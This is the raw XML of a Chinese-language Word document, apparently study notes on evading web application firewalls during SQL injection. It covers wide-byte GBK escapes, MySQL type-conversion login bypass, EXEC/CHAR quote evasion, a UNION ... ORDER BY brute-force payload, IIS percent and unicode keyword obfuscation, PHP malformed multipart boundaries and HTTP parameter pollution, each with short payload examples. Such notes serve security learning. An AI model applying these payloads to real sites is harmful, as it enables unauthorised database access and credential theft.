          <w:ilvl w:val="0"/>
          <w:numId w:val="54"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>空白符编码绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB7545" w:rsidRDefault="00EB7545" w:rsidP="00EB7545">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BEA83ED" wp14:editId="5ED3DF81">
            <wp:extent cx="5274310" cy="2235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53" w:rsidRPr="00DF0994" w:rsidRDefault="00855A53" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r w:rsidRPr="00DF0994">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>宽字节</w:t>
      </w:r>
      <w:r w:rsidRPr="00DF0994">
        <w:t>绕过办法：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00855A53" w:rsidP="00855A53">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>该</w:t>
      </w:r>
      <w:r>
        <w:t>办法是利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>gbk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
      <w:r>
        <w:t>中，部分中文</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:t>第二个字节是</w:t>
      </w:r>
      <w:r>
        <w:t>’\x27’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:t>即</w:t>
      </w:r>
      <w:r>
        <w:t>’\\’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:t>以此来让</w:t>
      </w:r>
      <w:r>
        <w:t>”’”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>逃出</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00855A53" w:rsidP="00855A53">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r w:rsidRPr="00BF397A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>服务</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF397A">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>端代码</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF397A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>仍</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF397A">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>不清楚。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00855A53" w:rsidP="00855A53">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>錦</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>’\xe5\x27’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00855A53" w:rsidP="00855A53">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>誠</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>’\xd5\x27’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00855A53" w:rsidP="00855A53">
      <w:pPr>
        <w:ind w:leftChars="200" w:left="420"/>
      </w:pPr>
      <w:r>
        <w:t>’\xbf\x27’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00855A53" w:rsidRDefault="00311E98" w:rsidP="00311E98">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类型转换特性绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00311E98" w:rsidRPr="00311E98" w:rsidRDefault="008A2112" w:rsidP="00311E98">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">select * from table where </w:t>
      </w:r>
      <w:r>
        <w:t>username</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>’a’=’a’;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>根据约定从左向右执行，所以先执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>username=</w:t>
      </w:r>
      <w:r>
        <w:t>’a’</w:t>
      </w:r>
      <w:r>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>一般该值为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。此时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句变为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from table where false=</w:t>
      </w:r>
      <w:r>
        <w:t>’a’</w:t>
      </w:r>
      <w:r>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>接着再计算时，</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将等号两边都转为数字后再比较。</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:t>alse</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>转为</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:t>’a’</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>也转为</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，所以等式成立。最终语句变为</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select * from table where true;</w:t>
      </w:r>
      <w:r w:rsidR="007967E6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，形成万能密码注入绕过。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00B75BE3" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用动态的查询执行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1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>动态执行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SQLServer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中，可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>EXEC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数以字符串方式执行查询。如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>EXEC(‘SELECT password FROM users’)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2.CHAR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0045694B" w:rsidRDefault="00912F6A" w:rsidP="00912F6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该办法可以绕过对引号的过滤</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0045694B" w:rsidRDefault="0045694B" w:rsidP="0045694B">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7820FF6B" wp14:editId="24F39A9E">
            <wp:extent cx="4737100" cy="15113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2DE" w:rsidRDefault="00BA22DE" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA22DE" w:rsidRDefault="00BA22DE" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="55"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过排序变化实现暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA22DE" w:rsidRDefault="00F77709" w:rsidP="008918F9">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过对目标列的排序，可以实现对目标列</w:t>
      </w:r>
      <w:r w:rsidR="00C44C2D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F77709" w:rsidRDefault="00F77709" w:rsidP="008918F9"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003800" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="25400" b="17780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2AAA" w:rsidRDefault="00812AAA">
                            <w:r>
                              <w:t>select * from table where username=’xx’ union select 1,2,0x5346… order by 3 desc -- mysql</w:t>
                            </w:r>
                            <w:r>
                              <w:t>语句（字符</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                              </w:rPr>
                              <w:t>拼接</w:t>
                            </w:r>
                            <w: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39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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA">
                      <w:r>
                        <w:t>select * from table where username=’xx’ union select 1,2,0x5346… order by 3 desc -- mysql</w:t>
                      </w:r>
                      <w:r>
                        <w:t>语句（字符</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                        </w:rPr>
                        <w:t>拼接</w:t>
                      </w:r>
                      <w:r>
                        <w:t>）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F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>程序</w:t>
      </w:r>
      <w:r>
        <w:t>特殊绕过办法</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>IIS</w:t>
      </w:r>
      <w:r>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:t>asp</w:t>
      </w:r>
      <w:r>
        <w:t>程序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%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处理</w:t>
      </w:r>
      <w:r>
        <w:t>不当</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:t>asp</w:t>
      </w:r>
      <w:r>
        <w:t>程序中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>处理</w:t>
      </w:r>
      <w:r>
        <w:t>不当，会被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>忽略</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="00C75434" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:hyperlink r:id="rId51" w:history="1">
        <w:r w:rsidR="000F40D1" w:rsidRPr="00B65BF2">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>http://xxx.asp?id=1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="000F40D1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F40D1">
        <w:t>an%d 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>iis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>aspx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>程序</w:t>
      </w:r>
      <w:r>
        <w:t>支持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iis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>aspx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>程序</w:t>
      </w:r>
      <w:r>
        <w:t>支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>unicode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
      <w:r>
        <w:t>，可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>unicode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
      <w:r>
        <w:t>代替正常字符。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="00C75434" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:hyperlink r:id="rId52" w:history="1">
        <w:r w:rsidR="000F40D1" w:rsidRPr="00B65BF2">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>http://xx.aspx?i</w:t>
        </w:r>
        <w:r w:rsidR="000F40D1" w:rsidRPr="00B65BF2">
          <w:rPr>
            <w:rStyle w:val="a4"/>
          </w:rPr>
          <w:t>d=1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="000F40D1">
        <w:t xml:space="preserve"> union s%u0065lect ‘hi’</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>iis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>另类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0F40D1" w:rsidRPr="00136C85" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>似乎跟</w:t>
      </w:r>
      <w:r>
        <w:t>系统</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
      <w:r>
        <w:t>方式是宽字符有关。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:leftChars="600" w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>select===s%u0065===s%u00f0lect</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:t>程序</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>特殊</w:t>
      </w:r>
      <w:r>
        <w:t>绕过办法</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Php+apache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>畸形</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>boundary</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在解析</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>multipart data</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的时候有自己的特性对于</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>boundary</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的识别，只取了逗号前面的内容，例如我们设置的</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>boundary</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>---,123456</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>解析的时候只识别了</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="0043569E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>后面的内容均没有识别。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:r w:rsidRPr="007531EF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="091B20AD" wp14:editId="70C14F3B">
            <wp:extent cx="5274310" cy="1325846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0D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>HPP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>HPP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:t>指</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r>
        <w:t>污染</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>直接</w:t>
      </w:r>
      <w:r>
        <w:t>针对参数的污染</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>反复</w:t>
      </w:r>
      <w:r>
        <w:t>对参数进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>赋值</w:t>
      </w:r>
      <w:r>
        <w:t>达</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>到</w:t>
      </w:r>
      <w:r>
        <w:t>污染目的，如：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r w:rsidRPr="003A5240">
        <w:t>?id=1&amp;id=2&amp;id=3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r w:rsidRPr="003A5240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>此种形式在获取</w:t>
      </w:r>
      <w:r w:rsidRPr="003A5240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="003A5240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>值的时候不同的</w:t>
      </w:r>
      <w:r w:rsidRPr="003A5240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="003A5240">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>技术获取的值是不一样的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F40D1" w:rsidRDefault="000F40D1" w:rsidP="000F40D1">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
